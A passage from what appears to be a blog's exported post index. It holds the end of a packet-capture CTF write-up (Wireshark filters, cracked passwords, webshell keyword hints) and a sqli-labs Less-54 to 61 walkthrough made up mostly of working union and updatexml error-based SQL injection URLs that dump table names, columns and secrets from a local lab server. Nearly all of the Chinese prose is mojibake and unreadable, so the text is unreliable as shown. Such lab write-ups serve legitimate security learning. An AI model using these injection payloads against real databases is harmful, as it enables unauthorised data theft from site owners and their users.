æ˜¯ä»€ä¹ˆ</h4><p>è¿™ä¸€é¢˜ä¸€å¼€å§‹æˆ‘è¿˜ä»¥ä¸ºç­”æ¡ˆåœ¨mailçš„é‚£ä¸¤ä¸ªåŒ…é‡Œé¢ï¼Œç»“æœè¿˜æ˜¯åœ¨å¯¹sqlæ“ä½œçš„é‚£ä¸ªåŒ…ä¸Šé¢ï¼Œä¸Šæ¥å°±ç›´æ¥<code>http contains &quot;ijnu@test.com&quot;</code>å•¥éƒ½æ²¡å‘ç°ï¼Œè¿™é¢˜ç›®æ„Ÿè§‰å‡ºé¢˜æ²¡è¯´å¾—å¤ªæ˜ç™½ã€‚ã€‚<br>åé¢å°±ç”¨<code>tcp contains &quot;ijnu@test.com&quot;</code>æŠŠåŒ…ç­›å‡ºæ¥ï¼Œå¹¶ä¸”è¿½è¸ªæµå°±è¡Œäº†ï¼Œå½“ç„¶è¿™é¢˜ä¹Ÿå¯ä»¥ç”¨<code>mysql contains &quot;ijnu@test.com&quot;</code> æŠŠåŒ…ç­›å‡ºæ¥<br>ä¸€æ ·çš„æ•ˆæœ<br><a href="https://imgchr.com/i/PjBV5F" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBV5F.md.png" alt="PjBV5F.md.png"></a><br>è¿™é¢˜æ˜æ˜¾å¯†ç ç»è¿‡MD5åŠ å¯†çš„ï¼Œæ‰€ä»¥è¿™é¢˜å¾—å»somd5ä¸Šè§£å¯†<br>è¿™é¢˜çš„ç­”æ¡ˆæ˜¯<code>edc123!@#</code></p><h4 id="9ã€è¢«é»‘å®¢æ”»å‡»çš„webæœåŠ¡å™¨ï¼Œç½‘å¡é…ç½®æ˜¯æ˜¯ä»€ä¹ˆï¼Œæäº¤ç½‘å¡å†…ç½‘ip"><a href="#9ã€è¢«é»‘å®¢æ”»å‡»çš„webæœåŠ¡å™¨ï¼Œç½‘å¡é…ç½®æ˜¯æ˜¯ä»€ä¹ˆï¼Œæäº¤ç½‘å¡å†…ç½‘ip" class="headerlink" title="9ã€è¢«é»‘å®¢æ”»å‡»çš„webæœåŠ¡å™¨ï¼Œç½‘å¡é…ç½®æ˜¯æ˜¯ä»€ä¹ˆï¼Œæäº¤ç½‘å¡å†…ç½‘ip"></a>9ã€è¢«é»‘å®¢æ”»å‡»çš„webæœåŠ¡å™¨ï¼Œç½‘å¡é…ç½®æ˜¯æ˜¯ä»€ä¹ˆï¼Œæäº¤ç½‘å¡å†…ç½‘ip</h4><p>åœ¨weboneçš„é‚£ä¸ªåŒ…é‡Œé¢ç›´æ¥æœç´¢å°±å¯ä»¥å¾—åˆ°<br><code>http contains &quot;eth&quot;</code><br><a href="https://imgchr.com/i/PjBm8J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBm8J.md.png" alt="PjBm8J.md.png"></a><br>æˆ–è€…ä½ ä¹Ÿå¯ä»¥ç›´æ¥ä»webtwoçš„åŒ…é‡Œé¢ç›´æ¥çœ‹åˆ°å†…ç½‘ipï¼Œè¿™ä¹Ÿå¯¹åº”äº†é¢˜ç›®åé¢å†…ç½‘æ¸—é€ä¹‹åï¼Œç”¨vpnè¿æ¥çš„è¿‡ç¨‹<br>ä¹Ÿå°±æ˜¯ä»<code>192.168.32.189(å†…ç½‘åœ°å€)-&gt;10.3.3.100(è¿æ¥vpnåé‡æ–°åˆ†é…çš„å†…ç½‘åœ°å€)</code><br>æ‰€ä»¥è¿™é¢˜çš„ç­”æ¡ˆå°±æ˜¯<code>10.3.3.100</code></p><h4 id="10ã€é»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·ç™»é™†äº†mailç³»ç»Ÿï¼ˆå½¢å¼-username-passwordï¼‰"><a href="#10ã€é»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·ç™»é™†äº†mailç³»ç»Ÿï¼ˆå½¢å¼-username-passwordï¼‰" class="headerlink" title="10ã€é»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·ç™»é™†äº†mailç³»ç»Ÿï¼ˆå½¢å¼: username/passwordï¼‰"></a>10ã€é»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·ç™»é™†äº†mailç³»ç»Ÿï¼ˆå½¢å¼: username/passwordï¼‰</h4><p>æ—¢ç„¶è¯´æ˜¯mailç³»ç»Ÿé‚£æˆ‘ä»¬å°±åœ¨mailçš„ä¸¤ä¸ªåŒ…é‡Œé¢å¯»æ±‚ç­”æ¡ˆï¼Œåœ¨mailtwoé‡Œé¢è¾“å…¥<code>http.request.method == &quot;POST&quot; and http contains &quot;password&quot;</code><br>å‡ºç°å¾ˆå¤šç›¸åŒusernameä¸åŒå¯†ç çš„è¯·æ±‚ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯åœ¨çˆ†ç ´mailç³»ç»Ÿï¼Œåœ¨mailtwo1è¿™ä¸€ä¸ªåŒ…é‡Œé¢åŒæ ·çš„è¿‡æ»¤è¿˜å­˜åœ¨å‡ æ¡æˆç«‹è¯·æ±‚ï¼Œå¯¹æ¯”ä¸€ä¸‹æ—¶é—´ï¼Œè¿™åº”è¯¥æ˜¯mailtwoè¿˜æ²¡çˆ†ç ´å®Œmailtwo1è¿™ä¸ªåŒ…ç»§ç»­çˆ†ç ´ï¼Œåœ¨mailtwoåŒ…é‡Œé¢çš„åºå·28çš„ä¿¡æ¯é‡Œé¢å¯¹åº”ä¸‹é¢çš„å‡ æ¡responseï¼Œå‘ç°ä¸€åå«wenwenniçš„äººåº”è¯¥æ˜¯ç™»å½•æˆåŠŸçš„ï¼Œç»è¿‡äº†ä¸€ä¸ªcheckçš„è¿‡ç¨‹ï¼Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> loginCheck = <span class="function"><span class="keyword">function</span>(<span class="params">form</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(form.username.value == <span class="string">""</span>) &#123;</span><br><span class="line">           alert(<span class="string">"..........................."</span>);</span><br><span class="line">           form.username.focus();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(form.password.value == <span class="string">""</span>) &#123;</span><br><span class="line">           alert(<span class="string">"..........................."</span>);</span><br><span class="line">           form.password.focus();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">var</span> key_hash = CryptoJS.MD5(<span class="string">'1234567812345678'</span>);</span><br><span class="line"><span class="keyword">var</span> key = CryptoJS.enc.Utf8.pars</span><br></pre></td></tr></table></figure><p>ç„¶åå›æ˜¾ä¸‹é¢çš„ä¿¡æ¯<br><img src="https://s1.ax1x.com/2018/08/30/PjBQDx.png" alt="PjBQDx.png"><br>æ‰€ä»¥æ„Ÿè§‰åº”è¯¥æœ‰è¿™æ ·çš„é‡ç‚¹å­—åœ¨é‡Œé¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&#123;\&quot;success\&quot;:true&#125;&quot; and ip.addr==192.168.94.59</span><br></pre></td></tr></table></figure><p>äºæ˜¯ä¹è¿‡æ»¤ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªåŒ…é‡Œé¢å¤ªå¤šäº†ï¼Œè¿™ä¸€é¢˜å…¶å®æˆ‘ä¹Ÿä¸æ€ä¹ˆç¡®å®šï¼Œä¸ºä»€ä¹ˆä¸è¿™ä¹ˆå¤šsuccessçš„è¿˜å¾—ç»§ç»­çˆ†ç ´ä¸‹å»ï¼Ÿå¸Œæœ›æœ‰å¤§ä½¬èƒ½è®²ä¸€è®²ã€‚ã€‚ã€‚ã€‚<br>ä¹‹é¥æŒ‰ç…§å¸¸è§„å¥—è·¯ï¼ŒæŠŠåœ¨mailtwo1åŒ…é‡Œé¢çš„ç­›å‡ºæ¥çš„æœ€åä¸€ä¸ªæ ‡è®°ä¸€ä¸‹ï¼Œå†è¿‡æ»¤å›httpï¼Œå†æ¥<code>ctrl+shift+N</code>è·³åˆ°æ ‡è®°å¤„ï¼Œç„¶åå¾€å›æ‰¾æœ‰å…³ç™»å½•çš„è¯·æ±‚ï¼Œæ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªè¯·æ±‚ã€‚ã€‚ã€‚<br><a href="https://imgchr.com/i/PjBlb6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBlb6.md.png" alt="PjBlb6.md.png"></a></p><p>é‚£ä¸ªå¯†ç éœ€è¦AESè§£å¯†ï¼Œåˆ©ç”¨ä¸Šé¢çš„ç®—æ³•æ±‚å‡ºkeyå¤§æ¦‚æ˜¯ã€‚ã€‚ã€‚ä¸ªäººæ„Ÿè§‰è¿™é¢˜æœ€æœ‰éš¾åº¦<br><a href="http://encode.chahuo.com/" target="_blank" rel="noopener">http://encode.chahuo.com/</a></p><p>è§£å¯†å‡ºæ¥çš„ç»“æœè·Ÿç¬¬ä¸‰é¢˜çš„ç­”æ¡ˆä¸€æ ·ã€‚ã€‚ã€‚ã€‚ã€‚åæ¥çœ‹åˆ°æœ‰äººè¯´è¿™æ˜¯ç¤¾å·¥æ‰‹æ®µï¼Œç›´æ¥å¥—ç¬¬ä¸‰é¢˜ç­”æ¡ˆï¼Œæœ‰æ„æ€æœ‰æ„æ€ã€‚ã€‚ã€‚ã€‚</p><h4 id="11ã€é»‘å®¢è·å¾—çš„vpn-ipæ˜¯å¤šå°‘"><a href="#11ã€é»‘å®¢è·å¾—çš„vpn-ipæ˜¯å¤šå°‘" class="headerlink" title="11ã€é»‘å®¢è·å¾—çš„vpn,ipæ˜¯å¤šå°‘"></a>11ã€é»‘å®¢è·å¾—çš„vpn,ipæ˜¯å¤šå°‘</h4><p>æœ€åä¸€é¢˜åœ¨vpntwoè¿™ä¸ªåŒ…é‡Œé¢ç›´æ¥ç‚¹å‡»ç»Ÿè®¡-&gt;ç«¯ç‚¹ï¼Œåˆå­¦åˆ°äº†ä¸€ç§æ–¹æ³•<br>çœ‹åˆ°å‘åŒ…æœ€å¤šçš„æ˜¯<code>10.3.4.3</code><br><a href="https://imgchr.com/i/PjB8UO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjB8UO.md.png" alt="PjB8UO.md.png"></a><br>æ‰€ä»¥è¿™ä¸ªç­”æ¡ˆå°±æ˜¯<code>10.3.4.3</code></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ„Ÿè§‰æµé‡åˆ†æè¿˜æ˜¯æœ‰ç‚¹å¥—è·¯çš„ï¼Œç¬¬ä¸€ç‚¹å°±æ˜¯å¤šç”¨ç‚¹containsè¯­å¥ï¼Œæ¨¡ç³ŠåŒ¹é…ä¸€ä¸‹ï¼Œå…³é”®å­—é è‡ªå·±çš„çµæ´»æ€§ä»¥åŠåˆ†æè¿‡ç¨‹å¾—å‡ºçš„ç»“è®ºï¼Œä¸ªäººæ„Ÿè§‰å¤§éƒ¨åˆ†é¢˜ç›®ä¼šç»™å‡ºï¼Œæ¯”å¦‚çš„è¯æœ‰å°é©¬ä¸Šä¼ çš„æ—¶å€™ï¼Œä½ ä¼šæƒ³åˆ°ä¼šå­˜åœ¨å…³é”®å­—ï¼Œæ¯”å¦‚eval,assertä¹‹ç±»çš„ä¸œè¥¿å—ï¼Œåˆ«äººç”¨æ‹¼æ¥æ–¹å¼ä¼ çš„é©¬é‚£å°±å¦å½“åˆ«è®ºäº†ã€‚ã€‚ä½†æ˜¯è¿˜æ˜¯å¯ä»¥é€šè¿‡èœåˆ€çš„ä¸€äº›æ ‡å¿—æ¥è¯†åˆ«çš„ï¼Œä¾‹å¦‚&gt;||&lt;ä¹‹ç±»ç¬¦å·ï¼Œ2333<br>ç¬¬äºŒå°±æ˜¯å„ç§è‡ªåŠ¨åŒ–æ‰«æå™¨çš„æŒ‡çº¹ç‰¹å¾ï¼Œè¿˜æ˜¯å¾—è®°ä¸€ä¸‹ï¼Œæœ‰ç‚¹ç”¨ï¼Œç¬¬ä¸‰å°±æ˜¯å¯ä»¥é€šè¿‡ç»Ÿè®¡å»å‘ç°æŸäº›ipçš„å‘åŒ…æ¬¡æ•°ï¼Œä»è€Œç¡®å®šå¯ç–‘ip</p>]]></content>
      
      <categories>
          
          <category> æµé‡åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æµé‡åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labså®æˆ˜è®°å½•(å››)</title>
      <link href="/sqli-labs-training-4.html"/>
      <url>/sqli-labs-training-4.html</url>
      <content type="html"><![CDATA[<h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><p>ä»è¿™ä¸€å…³å¼€å§‹å°±å¼€å§‹é™åˆ¶æ¬¡æ•°ï¼Œè€Œä¸”æ•°æ®åº“ä¹Ÿæ¢æˆäº†challengeï¼Œè¡¨åæ˜¯éšæœºçš„ï¼Œ<a id="more"></a>è¶…è¿‡æ¬¡æ•°å°±ä¼šé‡æ–°å®‰æ’<br>ä»£ç å®¡è®¡å‘ç°æ˜¯ç®€å•çš„å•å¼•å·é—­åˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;XG5G593V9H&apos;%23</span><br></pre></td></tr></table></figure><p>çˆ†è¯¦ç»†ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,secret_0IMA,3 from XG5G593V9H where id=1%23</span><br></pre></td></tr></table></figure><p>æäº¤è·å¾—çš„ä¿¡æ¯é‡ç½®åˆ·æ–°æ¬¡æ•°</p><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><p>è¿™æ¬¡å˜æˆäº†14æ¬¡<br>å…ˆæ„é€ æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=1) %23</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;8753JZ68TI&apos; %23</span><br></pre></td></tr></table></figure><p>çˆ†è¯¦ç»†ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,secret_UL8C,3 from 8753JZ68TI %23</span><br></pre></td></tr></table></figure><p>æäº¤é‡ç½®æ¬¡æ•°</p><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><p>æ„é€ ä¸€ä¸‹<br><code>http://192.168.100.105/sqlilabs/Less-56/?id=1&quot; %23</code>å›æ˜¾æˆåŠŸåæ¥ä¸€ç›´æ‹¿ä»–è¯•ç»“æœå¤±è´¥äº†<br>çœ‹äº†æºä»£ç æ‰çŸ¥é“åŸæ¥æ˜¯æ‹¬å·+å•å¼•å·çš„é—­åˆ<br>æ‰¾äº†ä¸€ä¸‹åŸå› </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM security.users WHERE id=(&apos;1&quot;#&apos;) LIMIT 0,1</span><br></pre></td></tr></table></figure><p>åœ¨æ•°æ®åº“ä¸­æ‰§è¡Œç¡®å®èƒ½å¤ŸæŸ¥åˆ°æ•°æ®ï¼Œé‚£ä¹ˆé—®é¢˜åœ¨å“ªå‘¢ï¼Ÿ</p><p>æŸ¥æ‰¾èµ„æ–™åå‘ç°ï¼Œmysqlåœ¨è¿ç®—è¿‡ç¨‹ä¸­èƒ½å¤Ÿè‡ªåŠ¨çš„æŠŠæ•°å­—è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œè€Œåœ¨æ¯”è¾ƒè¿ç®—ä¸­ï¼Œå¦‚æœæ˜¯æ•°å­—å’Œå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œåˆ™å¯ä»¥è‡ªåŠ¨çš„æŠŠå­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—ï¼Œè½¬æ¢çš„æ—¶å€™å¦‚æœé¦–å­—ç¬¦å­—ç¬¦æ˜¯æ•°å­—ï¼Œåˆ™ä¼šè½¬æ¢ä¸ºç›¸åº”çš„æ•°å­—ï¼Œä¾‹å¦‚<code>â€˜1â€#â€™</code>è½¬åŒ–ä¸ºæ•°å­—å€¼ä¸º<code>1</code>ï¼Œå¦‚æœæ˜¯<code>â€˜11fadsâ€™</code>åˆ™ä¸º<code>11</code>ï¼Œä¸è¿‡å¿…é¡»æ˜¯æ•°å­—å’Œå­—ç¬¦ä¸²æ¯”è¾ƒçš„æ—¶å€™æ‰ä¼šè½¬æ¢ï¼Œå¦‚æœéƒ½æ˜¯å­—ç¬¦çš„è¯åˆ™ä¸ä¼šè¿™æ ·ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) %23</span><br></pre></td></tr></table></figure><p>è¿™æ ·æ‰å¯¹<br>çˆ†è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;HVL992XP27&apos;%23</span><br></pre></td></tr></table></figure><p>çˆ†è¯¦ç»†ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,secret_E2BQ,3 from HVL992XP27%23</span><br></pre></td></tr></table></figure><p>æäº¤é‡ç½®æ¬¡æ•°</p><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><p>å°è¯•ä¸€ä¸‹é—­åˆ<br><code>http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,2,3 %23</code>å‘ç°è¿™ä¸ªæœ‰å›æ˜¾ï¼Œå¸¸è§„å¥—è·¯<br>çˆ†è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;YRA6E572GR&apos; %23</span><br></pre></td></tr></table></figure><p>çˆ†è¯¦ç»†ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,secret_LA1G,3 from YRA6E572GR %23</span><br></pre></td></tr></table></figure><p>æäº¤é‡ç½®æ¬¡æ•°</p><h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><p>è¿™ä¸€å…³å˜æˆäº†5æ¬¡<br>ä½†æ˜¯ä¸€ä¾§å°±æµ‹è¯•å‡ºæ¥æ˜¯å•å¼•å·çš„é—­åˆ<br>æ‰§è¡Œä»¥åå‘ç°ä¸å¯ä»¥ç”¨unionæ³¨å…¥ã€‚ã€‚ã€‚å› ä¸ºä¸è¿”å›ä»»ä½•æœ‰æ•°æ®åº“é‡Œé¢çš„ä¿¡æ¯<br>è¿™æ®µä»£ç å¯¹å…¶è¿›è¡Œäº†å¤„ç†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = array_reverse($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æœ‰æŠ¥é”™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æŠ¥é”™æ³¨å…¥<br>çˆ†è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;XXQT0FJQL2&apos;),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>çˆ†è¯¦ç»†ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select secret_LVSS from XXQT0FJQL2),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>æäº¤é‡ç½®æ¬¡æ•°</p><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><p>åŒæ ·çš„æŠ¥é”™æ³¨å…¥ï¼Œåªéœ€è¦åŠ ä¸ªæ³¨é‡Šï¼Œä»€ä¹ˆå•å¼•å·åŒå¼•å·é—­åˆéƒ½æ²¡æœ‰<br>çˆ†è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;CA4PGB5VU5&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>çˆ†è¯¦ç»†ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select secret_O5UY from CA4PGB5VU5),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>æäº¤é‡ç½®æ¬¡æ•°</p><h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><p>è¿™ä¸€æ¬¡æ˜¯<code>åŒå¼•å·+æ‹¬å·</code>çš„é—­åˆ<br>çˆ†è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;ZIYD79H66Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>çˆ†è¯¦ç»†ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select secret_JIPP from ZIYD79H66Q),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>æ­¤é¢˜å®Œç»“</p><h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><p>è¿™æ¬¡æ˜¯å•å¼•å·+ä¸¤ä¸ªæ‹¬å·çš„é—­åˆï¼Œä¹Ÿæ˜¯å¤Ÿå˜æ€çš„<br>çˆ†è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;0NCH5HWI5Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>çˆ†è¯¦ç»†ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select secret_6IKU from 0NCH5HWI5Q),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>å®Œç»“</p><h3 id="Less-62-Less65"><a href="#Less-62-Less65" class="headerlink" title="Less-62-Less65"></a>Less-62-Less65</h3><p>éƒ½æ˜¯ä¸€æ ·çš„éƒ½éœ€è¦ç›²æ³¨ï¼Œä½†æ˜¯ç»™çš„æ¬¡æ•°å¤ªå°‘ï¼Œå¾ˆéš¾è·‘å‡ºæ¥ï¼Œç­‰æˆ‘ç®—æ³•å­¦å¾—å¥½ä¸€ç‚¹å†å»æŠŠè„šæœ¬å†™å‡ºæ¥å§</p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>ç»ˆäºæŠŠè¿™ä¸ªSQLæ³¨å…¥çš„å¹³å°çš„é¢˜ç›®ç»™åšå®Œäº†ï¼Œæœ€è¿‘æ„Ÿå†’éš¾å—çš„ä¸€æ‰¹ã€‚ã€‚ã€‚æ’’èŠ±~~~</p>]]></content>
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labså®æˆ˜è®°å½•(ä¸‰)</title>
